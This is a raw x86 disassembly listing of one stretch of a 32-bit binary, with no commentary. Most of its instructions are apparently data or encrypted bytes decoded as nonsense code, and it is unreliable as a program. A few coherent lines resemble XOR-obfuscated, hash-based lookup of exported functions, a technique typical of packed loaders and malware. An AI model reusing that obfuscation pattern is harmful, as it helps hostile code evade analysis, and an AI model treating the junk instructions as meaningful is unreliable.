  414842:	mov    esp,0xca075083
  414847:	mov    ecx,DWORD PTR [ebp-0x8]
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x414811
  414861:	clc    
  414862:	jb     0x414845
  414864:	adc    bh,BYTE PTR [ebp+0x7f]
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x4147f7
  41486d:	mov    es,WORD PTR [edx-0x1d513bee]
  414873:	cld    
  414874:	mov    BYTE PTR [edx],bh
  414876:	sti    
  414877:	psubw  mm2,QWORD PTR [edx+0x44]
  41487b:	aas    
  41487c:	add    dh,BYTE PTR [edx+edi*1-0x5a]
  414880:	and    al,ah
  414882:	pop    ebx
  414883:	jne    0x4148d9
  414885:	out    0x84,eax
  414887:	ja     0x4148e0
  414889:	sbb    BYTE PTR [edx],0xf6
  41488c:	jmp    0x4148d3
  41488e:	xor    BYTE PTR [esi+0x31],0xc8
  414892:	test   eax,0x7a9bfa13
  414897:	adc    DWORD PTR [esi],edx
  414899:	fsub   DWORD PTR [ebx]
  41489b:	xlat   BYTE PTR ds:[ebx]
  41489c:	fbstp  TBYTE PTR [ebp+0x6d]
  41489f:	xor    bl,BYTE PTR [ebx-0x4e]
  4148a2:	outs   dx,BYTE PTR ds:[esi]
  4148a3:	idiv   dh
  4148a5:	dec    ebp
  4148a6:	adc    BYTE PTR ds:0x7e1b96e8,dh
  4148ac:	out    0x44,al
  4148ae:	cld    
  4148af:	jp     0x414885
  4148b1:	leave  
  4148b2:	sbb    DWORD PTR [esi],ebx
  4148b4:	and    eax,esp
  4148b6:	cmp    al,0xc
  4148b8:	mov    gs,WORD PTR [eax+0x4c]
  4148bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148bc:	ds mov edx,0x6324c744
  4148c2:	add    DWORD PTR [ebx-0x56],edi
  4148c5:	popf   
  4148c6:	add    eax,0x32290096
  4148cb:	dec    eax
  4148cc:	sbb    eax,DWORD PTR [eax+eiz*8-0x5ff8e20e]
  4148d3:	mov    dh,BYTE PTR [ecx-0x72]
  4148d6:	pop    esi
  4148d7:	xor    DWORD PTR [esi-0x3cf768a5],ebp
  4148dd:	jbe    0x414925
  4148df:	cmp    bl,bl
  4148e1:	pop    edx
  4148e2:	das    
  4148e3:	jmp    0x51fc:0x8a31540
  4148ea:	push   0xffffff92
  4148ec:	inc    ebp
  4148ed:	xchg   ebx,edx
  4148ef:	neg    BYTE PTR [esi]
  4148f1:	or     edx,DWORD PTR [edi+0x6a917770]
  4148f7:	(bad)  
  4148f8:	xor    cl,BYTE PTR [ebp+0x6f]
  4148fb:	gs jmp 0x87433388
  414901:	mov    ebp,esp
  414903:	cs push esp
  414905:	shl    ah,1
  414907:	xor    ch,BYTE PTR [ebp+0x69]
  41490a:	aad    0x33
  41490c:	(bad)  
  41490d:	mov    ds:0x44f2fc4e,al
  414912:	xchg   ecx,eax
  414913:	mov    ds:0xd0e45e80,eax
  414918:	mov    cl,dh
  41491a:	pop    ds
  41491b:	rcr    DWORD PTR [edi],0x5b
  41491e:	jecxz  0x414913
  414920:	adc    DWORD PTR [eax-0x57f4a60f],edi
  414926:	bound  edi,QWORD PTR [ecx+edx*4+0x6f]
  41492a:	push   ds
  41492b:	stos   BYTE PTR es:[edi],al
  41492c:	fcmovbe st,st(0)
  41492e:	fist   DWORD PTR [eax+0x35]
  414931:	sti    
  414932:	mov    eax,DWORD PTR [esi+0x3a095316]
  414938:	jecxz  0x414903
  41493a:	jae    0x414964
  41493c:	clc    
  41493d:	ficomp WORD PTR [esi+0x20]
  414940:	xor    ebp,DWORD PTR [eax+0x8d68b34]
  414946:	adc    bh,BYTE PTR [edi-0x6d]
  414949:	dec    eax
  41494a:	dec    eax
  41494b:	(bad)  
  41494c:	sbb    eax,0x2cb933ee
  414951:	loop   0x414932
  414953:	jbe    0x4148e1
  414955:	xor    ebx,eax
  414957:	repz mov es,ebx
  41495a:	pop    esp
  41495b:	das    
  41495c:	pop    ss
  41495d:	(bad)  
  41495e:	repz sub DWORD PTR [edi],ebx
  414961:	stos   DWORD PTR es:[edi],eax
  414962:	lahf   
  414963:	scas   al,BYTE PTR es:[edi]
  414964:	add    eax,0x216064a9
  414969:	and    dl,ch
  41496b:	adc    al,0x1b
  41496d:	jo     0x414912
  41496f:	adc    ebp,DWORD PTR [esi+eiz*2-0x3a70d9a6]
  414976:	and    BYTE PTR [edi-0x4c41fc4c],0xfa
  41497d:	(bad)  
  41497e:	std    
  41497f:	(bad)  
  414980:	out    0xf9,al
  414982:	ret    0x4d2a
  414985:	loop   0x4149e3
  414987:	jnp    0x4149b7
  414989:	leave  
  41498a:	mov    ebx,DWORD PTR [ebx+0x5f0170ef]
  414990:	out    0xf4,al
  414992:	sbb    ch,ah
  414994:	aas    
  414995:	int3   
  414996:	lahf   
  414997:	shl    BYTE PTR [edi+eax*2+0x1e],0xad
  41499c:	ss dec ebx
  41499e:	test   BYTE PTR [edx-0x6d],ah
  4149a1:	pop    edi
  4149a2:	daa    
  4149a3:	stos   DWORD PTR es:[edi],eax
  4149a4:	(bad)  
  4149a5:	cmp    bl,BYTE PTR [edi+0x20163fd4]
  4149ab:	(bad)  
  4149ac:	fsubr  QWORD PTR [ebx]
  4149ae:	jae    0x41496e
  4149b0:	xlat   BYTE PTR ds:[ebx]
  4149b1:	stos   DWORD PTR es:[edi],eax
  4149b2:	xor    ch,BYTE PTR [edi-0x1bf80771]
  4149b8:	adc    BYTE PTR ds:0xfbd840a4,0x70
  4149bf:	lods   eax,DWORD PTR ds:[esi]
  4149c0:	xor    eax,0x8b962d17
  4149c5:	imul   eax,DWORD PTR [ebx-0x3d],0xffffffaf
  4149c9:	loope  0x414a1f
  4149cb:	inc    esi
  4149cc:	stc    
  4149cd:	adc    edi,DWORD PTR [edx]
  4149cf:	jo     0x414a3c
  4149d1:	xor    eax,0xaace34b7
  4149d6:	push   ecx
  4149d7:	xchg   DWORD PTR [eax+esi*2],ebx
  4149da:	inc    ebx
  4149db:	jmp    0x79e2c6dc
  4149e0:	sbb    DWORD PTR [ebx],ecx
  4149e2:	rcl    BYTE PTR [ebp+0x587a3fb8],0x4b
  4149e9:	mov    ah,BYTE PTR [ebp+0x2d936362]
  4149ef:	not    DWORD PTR [esi+0x6b183dde]
  4149f5:	pop    ds
  4149f6:	retf   
  4149f7:	cmp    eax,0x26a8160e
  4149fc:	add    DWORD PTR [edx+0x67023e22],edx
  414a02:	neg    ch
  414a04:	pusha  
  414a05:	xchg   edi,eax
  414a06:	inc    esi
  414a07:	push   0x37
  414a09:	mov    ebx,0x459044d6
  414a0e:	xor    ch,0x10
  414a11:	(bad)  
  414a12:	test   eax,0x78699240
  414a17:	call   edi
  414a19:	jbe    0x4149c2
  414a1b:	cli    
  414a1c:	jp     0x414a1e
  414a1e:	ror    BYTE PTR [eax+ebx*4+0x74e41397],1
  414a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a26:	or     ah,dl
  414a28:	xchg   ebp,eax
  414a29:	jmp    0xb6985dd3
  414a2e:	dec    ebp
  414a2f:	enter  0xb4d4,0xe4
  414a33:	xchg   ebp,eax
  414a34:	sbb    al,BYTE PTR [edx+esi*8-0x861fd02]
  414a3b:	sub    ah,ah
  414a3d:	pop    ebx
  414a3e:	(bad)  
  414a40:	cmp    al,0x9b
  414a42:	pop    ds
  414a43:	(bad)  
  414a44:	add    ecx,DWORD PTR [edi]
  414a46:	cmp    bl,bl
  414a48:	mov    ecx,0xc0b972a2
  414a4d:	pop    eax
  414a4e:	loope  0x414a56
  414a50:	test   eax,0xc101f9a4
  414a55:	jae    0x414ad1
  414a57:	push   0x1
  414a59:	fwait
  414a5a:	add    DWORD PTR [ecx+edi*1-0x53b5745e],ebx
  414a61:	add    eax,0xef651861
  414a66:	pop    ecx
  414a67:	fwait
  414a68:	mov    ss:0xa0b197cb,eax
  414a6e:	mov    eax,ds:0x2345d719
  414a73:	cmp    edx,DWORD PTR [ebp-0x39]
  414a76:	sub    eax,0xcee180e0
  414a7b:	jno    0x414aa4
  414a7d:	mov    esi,0xd5f85229
  414a82:	add    esi,DWORD PTR [eax-0x6fc9dca1]
  414a88:	adc    al,0x7e
  414a8a:	imul   edx,DWORD PTR [ecx-0x487229d3],0xffffffbf
  414a91:	pop    ebx
  414a92:	mov    bl,0x5a
  414a94:	(bad)  
  414a95:	xor    esp,eax
  414a97:	ds inc ebp
  414a99:	popf   
  414a9a:	shl    BYTE PTR [eax-0xc],cl
  414a9d:	and    al,0x3
  414a9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414aa0:	sbb    ebp,DWORD PTR [edi-0x60e91ee4]
  414aa6:	out    dx,eax
  414aa7:	push   0x53a7ebd7
  414aac:	sub    eax,0x729b7d70
  414ab1:	sub    eax,0x347a4355
  414ab6:	pushf  
  414ab7:	loopne 0x414aef
  414ab9:	or     al,0x1e
  414abb:	sbb    eax,0xb4e4a935
  414ac0:	pop    esp
  414ac1:	and    ebp,ebp
  414ac3:	out    dx,al
  414ac4:	mov    edi,0x11240d5e
  414ac9:	push   ebp
  414aca:	ja     0x414aa5
  414acc:	jns    0x414b48
  414ace:	mov    ch,0xcb
  414ad0:	and    edi,DWORD PTR [eax-0x31fb3090]
  414ad6:	pusha  
  414ad7:	pusha  
  414ad8:	mov    bh,0x69
  414ada:	les    edi,FWORD PTR fs:[edi-0x59]
  414ade:	jmp    DWORD PTR [ecx-0x2f099a67]
  414ae4:	push   0x7bff5f9f
  414ae9:	inc    ecx
  414aea:	lods   eax,DWORD PTR ds:[esi]
  414aeb:	iret   
  414aec:	xchg   ebp,eax
  414aed:	gs xor dl,bh
  414af0:	mov    al,ds:0x62549caa
  414af5:	push   esi
  414af6:	scas   al,BYTE PTR es:[edi]
  414af7:	push   ebp
  414af8:	test   eax,0x9fb50739
  414afd:	push   esi
  414afe:	cmp    DWORD PTR [eax+esi*4-0x25f836c4],0x17c2917
  414b09:	aaa    
  414b0a:	sti    
  414b0b:	adc    ebp,DWORD PTR [edi+0x49e44f54]
  414b11:	jo     0x414b75
  414b13:	sbb    eax,0x567f8e62
  414b18:	or     bh,ah
  414b1a:	cdq    
  414b1b:	nop
  414b1c:	and    al,0x46
  414b1e:	aaa    
  414b1f:	sbb    al,ch
  414b21:	push   ds
  414b22:	pop    edi
  414b23:	push   ebp
  414b24:	lods   eax,DWORD PTR ds:[esi]
  414b25:	sahf   
  414b26:	in     al,dx
  414b27:	push   cs
  414b28:	shl    BYTE PTR [edi-0x6426946e],1
  414b2e:	push   0x7a
  414b30:	push   eax
  414b31:	cmp    eax,DWORD PTR [ecx]
  414b33:	add    eax,ebx
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	out    dx,eax
  414bb7:	and    al,0x95
  414bb9:	mov    DWORD PTR [ebx+0x7b],ebx
  414bbc:	jg     0x414c2e
  414bbe:	mov    ecx,0xf970707e
  414bc3:	cli    
  414bc4:	(bad)  
  414bc5:	dec    BYTE PTR [ebx]
  414bc7:	aas    
  414bc8:	jge    0x414c24
  414bca:	xor    DWORD PTR [ecx-0x36e3294],eax
  414bd0:	inc    ecx
  414bd1:	pop    ebp
  414bd2:	pop    ss
  414bd3:	scas   eax,DWORD PTR es:[edi]
  414bd4:	(bad)  
  414bd5:	jp     0x414b9a
  414bd7:	mov    ebx,gs
  414bd9:	xor    dl,ch
  414bdb:	pop    ss
  414bdc:	dec    eax
  414bdd:	push   esi
  414bde:	add    BYTE PTR [edi-0x770ffc4f],dl
  414be4:	shl    al,cl
  414be6:	cmp    BYTE PTR [eax],0x78
  414be9:	push   ebp
  414bea:	icebp  
  414beb:	bound  esp,QWORD PTR [ebx]
  414bed:	xchg   ebx,eax
  414bee:	ins    DWORD PTR es:[edi],dx
  414bef:	push   ebp
  414bf0:	sbb    eax,0x84b84fac
  414bf5:	adc    bh,bh
  414bf7:	inc    edx
  414bf8:	fsub   QWORD PTR [ecx+0x168c2a]
  414bfe:	push   0xc5aab4f8
  414c03:	ret    
  414c04:	dec    edi
  414c05:	or     DWORD PTR [ecx+0x30],ebx
  414c08:	xchg   DWORD PTR [edx],ecx
  414c0a:	imul   ebx,edi,0x4dbf5c2b
  414c10:	lea    edx,gs:[esi-0x482ef01b]
  414c17:	les    ebp,FWORD PTR [edx-0x50bc3ca1]
  414c1d:	cmp    al,0x58
  414c1f:	sub    ecx,ebp
  414c21:	push   eax
  414c22:	gs fwait
  414c24:	dec    edx
  414c25:	xor    ecx,DWORD PTR [esi-0xc]
  414c28:	xchg   BYTE PTR [ebx+0x5],ah
  414c2b:	jp     0x414c90
  414c2d:	add    al,0x59
  414c2f:	sub    bh,BYTE PTR [edx-0x1d449eb9]
  414c35:	xchg   edx,eax
  414c36:	loopne 0x414bfa
  414c38:	ret    
  414c39:	and    ebp,DWORD PTR [edi-0x1]
  414c3c:	cmp    DWORD PTR [esi+ecx*8+0x7],eax
  414c40:	push   ds
  414c41:	outs   dx,DWORD PTR ds:[esi]
  414c42:	sbb    bl,ch
  414c44:	mov    edx,0x2a89715d
  414c49:	sbb    bh,dh
  414c4b:	loopne 0x414c25
  414c4d:	push   cs
  414c4e:	lods   al,BYTE PTR ds:[esi]
  414c4f:	xor    BYTE PTR [ecx+edi*8-0x28723477],ah
  414c56:	rep ins BYTE PTR es:[edi],dx
  414c58:	loope  0x414c62
  414c5a:	dec    esp
  414c5b:	imul   ebp,DWORD PTR [esi-0x39],0x4a
  414c5f:	sbb    ecx,DWORD PTR [ebp+0x39]
  414c62:	pushw  cs
  414c64:	fs mov cl,0x6a
  414c67:	cwde   
  414c68:	cmp    al,0x2f
  414c6a:	sti    
  414c6b:	xor    al,0x2d
  414c6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c6e:	shr    DWORD PTR [edi-0x4bdff333],1
  414c74:	add    DWORD PTR [ebp+0x32],ebx
  414c77:	jmp    0xa0a1213f
  414c7c:	loope  0x414ca6
  414c7e:	mov    edx,0xb66ff97a
  414c83:	push   ecx
  414c84:	(bad)  
  414c85:	dec    esp
  414c86:	inc    edx
  414c87:	mov    bh,0x41
  414c89:	dec    edi
  414c8a:	jnp    0x414cf1
  414c8c:	adc    eax,0x285bdbcc
  414c91:	adc    dl,bh
  414c93:	(bad)  
  414c94:	fstp   TBYTE PTR [esi-0x6d]
  414c97:	inc    ebx
  414c98:	add    ch,BYTE PTR [eax]
  414c9a:	mov    esp,0xb9e3c2a5
  414c9f:	into   
  414ca0:	inc    edx
  414ca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ca2:	inc    edx
  414ca3:	jl     0x414cc5
  414ca5:	inc    edi
  414ca6:	imul   edx,DWORD PTR [esi],0xffffffcf
  414ca9:	xor    edx,edx
  414cab:	or     DWORD PTR [ebp-0x57],ebx
  414cae:	mov    ds:0x7a045da6,al
  414cb3:	popf   
  414cb4:	mov    al,0xc5
  414cb6:	rcl    eax,1
  414cb8:	push   esp
  414cb9:	loope  0x414c80
  414cbb:	scas   al,BYTE PTR es:[edi]
  414cbc:	(bad)  [eax]
  414cbe:	imul   esi,edi,0xffffffe8
  414cc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cc2:	push   0xcada4e7b
  414cc7:	sub    edx,esp
  414cc9:	cmp    BYTE PTR [edx-0x53a860bb],ch
  414ccf:	cmp    esp,DWORD PTR [ebp+0x7b]
  414cd2:	gs mov ah,0x23
  414cd5:	in     al,dx
  414cd6:	dec    ebx
  414cd7:	pop    ebp
  414cd8:	sti    
  414cd9:	jae    0x414cd1
  414cdb:	into   
  414cdc:	mov    bl,0xdd
  414cde:	ret    
  414cdf:	in     eax,dx
  414ce0:	inc    esi
  414ce1:	outs   dx,DWORD PTR ds:[esi]
  414ce2:	mov    edi,0x8e0b2b23
  414ce7:	add    eax,0xcf98bd6d
  414cec:	ret    0xb8e0
  414cef:	(bad)
  414cf2:	out    dx,al
  414cf3:	adc    DWORD PTR [ecx+esi*2],edx
  414cf6:	and    al,0x83
  414cf8:	imul   edi,DWORD PTR ds:0x140d6bb8,0x397bce9d
  414d02:	cmp    BYTE PTR ds:0x3c07ba40,dl
  414d08:	push   cs
  414d09:	(bad)  
  414d0a:	add    BYTE PTR [bx+di],al
  414d0d:	fadd   DWORD PTR [esi+ecx*1+0x1d]
  414d11:	pop    esi
  414d12:	xchg   esi,eax
  414d13:	push   ebp
  414d14:	ja     0x414ca3
  414d16:	push   0xffffffc0
  414d18:	loope  0x414ca8
  414d1a:	in     al,0xd0
  414d1c:	xchg   ecx,eax
  414d1d:	and    cl,dh
  414d1f:	adc    eax,0x89dd7750
  414d24:	je     0x414d8c
  414d26:	enter  0x8dbd,0x5e
  414d2a:	js     0x414cc1
  414d2c:	sub    BYTE PTR [ebx],0x75
  414d2f:	push   ebp
  414d30:	push   edx
  414d31:	inc    ebx
  414d32:	(bad)  
  414d33:	xlat   BYTE PTR ds:[ebx]
  414d34:	loopne 0x414d76
  414d36:	out    0x8e,al
  414d38:	loope  0x414d1c
  414d3a:	xor    al,0xe7
  414d3c:	push   0xffffff83
  414d3e:	mov    esi,0x5623c1a9
  414d43:	pop    edx
  414d44:	je     0x414d89
  414d46:	jo     0x414d3c
  414d48:	add    BYTE PTR [ebx],0x75
  414d4b:	loopne 0x414d3c
  414d4d:	in     al,dx
  414d4e:	sub    DWORD PTR [ebx+esi*2+0x1e],0x9d243c3f
  414d56:	shr    DWORD PTR [ebx],cl
  414d58:	out    0xf3,al
  414d5a:	int    0x3a
  414d5c:	mov    dl,0x14
  414d5e:	add    esp,DWORD PTR [edi]
  414d60:	mov    BYTE PTR ds:0xcdd042a3,al
  414d66:	call   0x84dbc5cd
  414d6b:	cmc    
  414d6c:	(bad)  [edi+0x43c67c9e]
  414d72:	test   eax,0x6c65e78c
  414d77:	imul   BYTE PTR [ebx-0x22]
  414d7a:	xchg   ebx,eax
  414d7b:	add    DWORD PTR ds:0x220e1482,esp
  414d81:	cmp    DWORD PTR [eax-0x5259606e],0xd53fb000
  414d8b:	std    
  414d8c:	into   
  414d8d:	jno    0x414d7d
  414d8f:	inc    ecx
  414d90:	dec    ecx
  414d91:	das    
  414d92:	in     eax,dx
  414d93:	dec    ebp
  414d94:	mov    ds,WORD PTR [ebx]
  414d96:	sbb    ebp,DWORD PTR [esi+0x21a96dae]
  414d9c:	xchg   esp,eax
  414d9d:	add    al,0x7d
  414d9f:	xchg   DWORD PTR [eax+0x6a],edx
  414da2:	ret    0xb37f
  414da5:	out    0x49,eax
  414da7:	nop
  414da8:	mov    cl,0x32
  414daa:	rcr    DWORD PTR [esp+eax*4],0xe6
  414dae:	scas   eax,DWORD PTR es:[edi]
  414daf:	in     al,0x9c
  414db1:	xchg   esp,eax
  414db2:	aas    
  414db3:	xchg   edx,eax
  414db4:	xchg   DWORD PTR [ecx+edi*1+0x62],ebx
  414db8:	lods   al,BYTE PTR ds:[esi]
  414db9:	cld    
  414dba:	and    al,0x8
  414dbc:	aam    0x76
  414dbe:	je     0x414e1e
  414dc0:	neg    dl
  414dc2:	push   eax
  414dc3:	out    dx,eax
  414dc4:	inc    esp
  414dc5:	add    edi,0xffffff99
  414dc8:	fnstenv ds:0xce6e9844
  414dce:	and    al,0x9f
  414dd0:	stos   BYTE PTR es:[edi],al
  414dd1:	fcmovnu st,st(5)
  414dd3:	mov    gs,WORD PTR [edi+0x27787942]
  414dd9:	call   0xcbb9:0xbfe1ab8e
  414de0:	mov    esp,0x93add8f4
  414de5:	cmp    eax,0x32614fee
  414dea:	stos   BYTE PTR es:[edi],al
  414deb:	popa   
  414dec:	inc    BYTE PTR [ebx-0xc1ad650]
  414df2:	arpl   WORD PTR [esi-0x69],sp
  414df5:	cmovge eax,DWORD PTR [ebp+0x3d]
  414df9:	ins    BYTE PTR es:[edi],dx
  414dfa:	jne    0x414e58
  414dfc:	lds    ebx,FWORD PTR [edi+edi*2+0x31]
  414e00:	cwde   
  414e01:	adc    dh,BYTE PTR [edx]
  414e03:	jo     0x414dc2
  414e05:	xor    esi,DWORD PTR [esi-0x13a54317]
  414e0b:	add    esi,esi
  414e0d:	inc    ebx
  414e0e:	outs   dx,BYTE PTR ds:[esi]
  414e0f:	cwde   
  414e10:	mov    ebx,0xd4221bb
  414e15:	push   ds
  414e16:	sbb    al,0xfb
  414e18:	push   di
  414e1a:	xacquire xchg DWORD PTR [ebx+eax*1-0x41],ecx
  414e1f:	jae    0x414e1e
  414e21:	retf   0x4bcf
  414e24:	popf   
  414e25:	xchg   esp,eax
  414e26:	ret    
  414e27:	loopne 0x414e3d
  414e29:	or     al,0xb
  414e2b:	mov    ds:0xc4765ad2,al
  414e30:	ds cwde 
  414e32:	dec    edi
  414e33:	adc    al,0xc6
  414e35:	add    al,0x75
  414e37:	inc    edi
  414e38:	les    edx,FWORD PTR [ecx+0x4a522f05]
  414e3e:	lods   eax,DWORD PTR ds:[esi]
  414e3f:	cmp    ah,BYTE PTR [ebx-0xa]
  414e42:	cmp    DWORD PTR [ebp-0x2f],0xf2f17944
  414e49:	mov    ebp,0x760ccfbd
  414e4e:	sbb    BYTE PTR [eax-0x7116bada],cl
  414e54:	or     al,0x9e
  414e56:	ja     0x414e68
  414e58:	fs cs mov esi,0xe7de6508
  414e5f:	dec    esi
  414e60:	pop    edi
  414e61:	pop    ebx
  414e62:	sub    al,0xdb
  414e64:	stc    
  414e65:	mov    ds:0xd025f536,al
  414e6a:	das    
  414e6b:	das    
  414e6c:	or     DWORD PTR [edx+0xa],edi
  414e6f:	mov    BYTE PTR [bx+di],ch
  414e72:	sub    al,0xf9
  414e74:	ss in  al,0xd7
  414e77:	(bad)  
  414e78:	std    
  414e79:	push   esi
  414e7a:	jb     0x414e19
  414e7c:	pushf  
  414e7d:	retf   0x2187
  414e80:	arpl   sp,ax
  414e82:	add    BYTE PTR [eax],dl
  414e84:	pop    esp
  414e85:	mov    bl,0x2b
  414e87:	loop   0x414edd
  414e89:	pop    ecx
  414e8a:	push   0x5
  414e8c:	dec    ecx
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	mov    ch,0x2
  414eae:	cmp    al,BYTE PTR [esi]
  414eb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eb1:	js     0x414f32
  414eb3:	jo     0x414e6e
  414eb5:	jle    0x414f27
  414eb7:	jo     0x414ec6
  414eb9:	or     BYTE PTR [eax-0x4c],ah
  414ebc:	dec    eax
  414ebd:	shr    BYTE PTR [eax+esi*2],0x1f
  414ec1:	das    
  414ec2:	pushf  
  414ec3:	pop    esp
  414ec4:	xor    DWORD PTR ds:0x6e3c1957,edi
  414eca:	shl    BYTE PTR [ebx+eax*2-0x441cc5b7],0xc6
  414ed2:	push   eax
  414ed3:	or     ch,0x98
  414ed6:	dec    eax
  414ed7:	xchg   esi,eax
  414ed8:	xchg   edi,eax
  414ed9:	addr16 push esp
  414edb:	push   es
  414edc:	add    DWORD PTR [ecx-0x26],edx
  414edf:	cs or  eax,0x958e1340
  414ee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ee6:	sahf   
  414ee7:	push   ebp
  414ee8:	imul   eax,ecx,0xeb2a64c9
  414eee:	cli    
  414eef:	or     al,0xa1
  414ef1:	sub    esp,DWORD PTR [eax-0x45]
  414ef4:	test   eax,0xc1fa2806
  414ef9:	add    eax,0x62c0d3cf
  414efe:	mov    edx,0x83fd2929
  414f03:	dec    edi
  414f04:	add    DWORD PTR [esi],ebx
  414f06:	sbb    al,0xcb
  414f08:	and    cl,dh
  414f0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f0b:	enter  0x2dc3,0x2a
  414f0f:	push   ss
  414f10:	sbb    eax,0xa16a96c4
  414f15:	popa   
  414f16:	add    WORD PTR [ecx+ebp*2-0x63fb3ef8],ax
  414f1e:	fdiv   QWORD PTR [edi]
  414f20:	inc    edi
  414f21:	cmp    eax,ecx
  414f23:	cmp    DWORD PTR [edx+0x4d],ebp
  414f26:	loopne 0x414f6e
  414f28:	sub    eax,0xf251b002
  414f2d:	jb     0x414f46
  414f2f:	jg     0x414f66
  414f31:	popa   
  414f32:	inc    edx
  414f33:	leave  
  414f34:	add    eax,0xe8cb1ed5
  414f39:	and    BYTE PTR [eax],ah
  414f3b:	cdq    
  414f3c:	mov    edi,0xdf18633b
  414f41:	mov    esi,0xfb393011
  414f46:	fs cmp al,0xc5
  414f49:	aad    0x5d
  414f4b:	fcomp  DWORD PTR [eax-0x72]
  414f4e:	jp     0x414fcd
  414f50:	pop    ebp
  414f51:	std    
  414f52:	jle    0x414f19
  414f54:	gs mov ebx,0x47ef8251
  414f5a:	jle    0x414f39
  414f5c:	das    
  414f5d:	call   FWORD PTR ss:[ebx+0x72eb1cdd]
  414f64:	xchg   edx,eax
  414f65:	jge    0x414f3f
  414f67:	jbe    0x414f60
  414f69:	push   ebp
  414f6a:	pmuludq mm1,QWORD PTR [edi-0x4d896eb7]
  414f71:	jle    0x414fbd
  414f73:	out    0xe9,eax
  414f75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f76:	cmp    DWORD PTR [eax],0x8e7598b
  414f7c:	mov    ebp,0x334d58e4
  414f81:	iret   
  414f82:	sbb    DWORD PTR [eax-0x41],edi
  414f85:	sbb    dh,cl
  414f87:	(bad)  
  414f88:	stc    
  414f89:	in     eax,0x3b
  414f8b:	aam    0x17
  414f8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f8e:	into   
  414f8f:	dec    esp
  414f90:	inc    ebp
  414f91:	xor    DWORD PTR [edx],ecx
  414f93:	stos   BYTE PTR es:[edi],al
  414f94:	rcr    DWORD PTR [edi],cl
  414f96:	dec    ecx
  414f97:	xchg   esp,eax
  414f98:	push   0xffffffd7
  414f9a:	popf   
  414f9b:	idiv   BYTE PTR [edi-0x7128efdc]
  414fa1:	jl     0x414feb
  414fa3:	(bad)  
  414fa5:	test   esi,edi
  414fa7:	sbb    dl,dl
  414fa9:	or     dl,BYTE PTR [edi+0x76]
  414fac:	and    ah,BYTE PTR [ebp-0x75]
  414faf:	hlt    
  414fb0:	cmp    ebp,esp
  414fb2:	dec    ebp
  414fb3:	lahf   
  414fb4:	setbe  bh
  414fb7:	inc    ecx
  414fb8:	rcr    BYTE PTR [edx-0x65],cl
  414fbb:	fmul   DWORD PTR [edi+0x33]
  414fbe:	cmp    eax,0x395bf6b4
  414fc3:	adc    al,0xc6
  414fc5:	pop    ss
  414fc6:	loopne 0x415013
  414fc8:	sub    eax,ebp
  414fca:	dec    edx
  414fcb:	mov    cl,0x4d
  414fcd:	push   eax
  414fce:	cmp    BYTE PTR [edx],0x3
  414fd1:	jmp    0x414fad
  414fd3:	or     eax,0x9d00a35a
  414fd8:	fxch   st(5)
  414fda:	jecxz  0x414f74
  414fdc:	mov    al,0x37
  414fde:	ins    DWORD PTR es:[edi],dx
  414fdf:	fwait
  414fe0:	jo     0x415043
  414fe2:	or     al,0xab
  414fe4:	test   BYTE PTR [eax],ch
  414fe6:	repz push ds
  414fe8:	daa    
  414fe9:	adc    eax,0x6eb2321e
  414fee:	loop   0x415047
  414ff0:	ds inc ecx
  414ff2:	cmp    bl,BYTE PTR [ebx+0x2]
  414ff5:	pop    ecx
  414ff6:	xor    esp,0x90bb41f4
  414ffc:	mov    al,ds:0x382377ab
  415001:	rcr    edx,0x4b
  415004:	add    esp,DWORD PTR [ecx+0xd]
